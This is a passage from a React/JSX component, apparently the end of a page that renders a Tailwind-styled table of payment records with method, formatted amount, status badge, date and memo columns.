                      <td className="px-3 py-2 whitespace-nowrap">
                        {r.method}
                      </td>
                      <td className="px-3 py-2 whitespace-nowrap">
                        {formatMoneyFromMinor(r.amountMinor)}
                      </td>
                      <td className="px-3 py-2">
                        <span className="inline-flex items-center px-2 py-0.5 rounded-full border border-white/20 text-[11px]">
                          {r.status}
                        </span>
                      </td>
                      <td className="px-3 py-2 whitespace-nowrap">
                        {formatDate(r.createdAt)}
                      </td>
                      <td className="px-3 py-2 max-w-xs">
                        <span className="line-clamp-2">
                          {r.memo ?? "-"}
                        </span>
                      </td>
                    </tr>
                  ))}
              </tbody>
            </table>
          </div>
        </section>
      </main>
    </div>
  );
}
